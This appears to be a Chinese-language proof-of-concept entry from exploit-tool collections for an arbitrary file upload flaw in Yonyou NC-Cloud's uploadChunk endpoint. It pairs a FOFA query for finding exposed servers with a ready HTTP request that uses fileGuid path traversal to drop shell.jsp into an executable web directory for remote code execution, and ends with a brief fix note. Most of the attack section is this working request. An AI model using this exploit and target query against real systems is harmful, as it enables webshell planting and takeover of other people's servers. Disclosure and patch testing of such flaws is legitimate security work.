---
fofa: "app=\"用友-NC-Cloud\""
source: "OA-EXPTOOL/Lucifer1993 + afrog-pocs/zan8in"
---

# 用友 NC-Cloud uploadChunk 任意文件上传漏洞

# 漏洞描述

用友 NC-Cloud /ncchr/pm/fb/attachment/uploadChunk 分片上传接口存在任意文件上传漏洞。攻击者可通过 fileGuid 参数进行目录穿越，将上传的 JSP 木马写入 /nccloud/ 目录下可执行路径，进而远程控制服务器。

# 影响版本

用友 NC-Cloud

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 未公开 | 未知 |

# 漏洞复现

FOFA：app="用友-NC-Cloud"

POC/EXP：

```
POST /ncchr/pm/fb/attachment/uploadChunk?fileGuid=/../../../nccloud/&chunk=1&chunks=1 HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Accept-Encoding: gzip, deflate
Connection: close

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.jsp"
Content-Type: application/octet-stream

<% out.println("test"); %>
------WebKitFormBoundary--
```

上传成功后，木马落地为 /nccloud/shell.jsp（文件名可控），直接访问即可执行任意代码。

# 漏洞修复

联系用友官方获取安全补丁，对 fileGuid 参数做路径规范化校验，限制上传文件类型与落地目录。
